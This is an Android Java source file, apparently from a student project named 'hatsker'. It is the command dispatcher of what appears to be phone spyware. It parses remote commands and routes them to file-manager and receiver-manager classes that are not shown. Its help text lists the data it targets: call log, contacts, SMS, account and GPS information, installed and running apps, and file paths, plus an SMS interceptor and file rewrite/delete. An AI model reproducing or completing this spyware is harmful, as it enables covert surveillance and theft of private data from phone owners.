package com.example.student.hatsker;

import android.content.Context;
import android.util.Log;

/**
 * Created by student on 7/26/17.
 */

public class DecisionMaker {

    private final String RECEIVER_MANAGER = "receiverManager";
    private final String FILE_MANAGER = "fileManager";
    private final String HELP_REQUEST = "help";


    private final String helpString = "fileManager | receiverManager\nrewrite, delete | register, unregister\n" +
            "callLog, contacts, filePaths, installedApps, runningApps, sms, systemInfo, accountInfo, gpsInfo | smsReceiver";

    public void makeDecision(Context context, String cmd)
    {

        String cmdHere="";
        String cmdForNext="";

        for (int i = 0; i < cmd.length(); i++) {
            if (cmd.charAt(i) == ' ')
            {
                cmdHere = cmd.substring(0, i);
                cmdForNext = cmd.substring(i+1);
                break;
            }
        }

        Log.i("CMD", cmdHere + "\n" + cmdForNext);


        switch(cmdHere)
        {
            case RECEIVER_MANAGER: callReceiverManager(context, cmdForNext);
                break;
            case FILE_MANAGER: callFileManager(cmdForNext, context);
                break;
            case HELP_REQUEST: callHelp();
                break;
            default: Log.i("Decision maker", "wrong command, help:"); callHelp();
                break;
        }

    }

    public void callReceiverManager(Context context, String cmd)
    {
        new ReceiverManager(cmd, context);
    }

    public void callFileManager(String cmd, Context context)
    {
        new FileManager(cmd, context);
    }

    public void callHelp()
    {
        Log.i("HELP", helpString);
    }


}
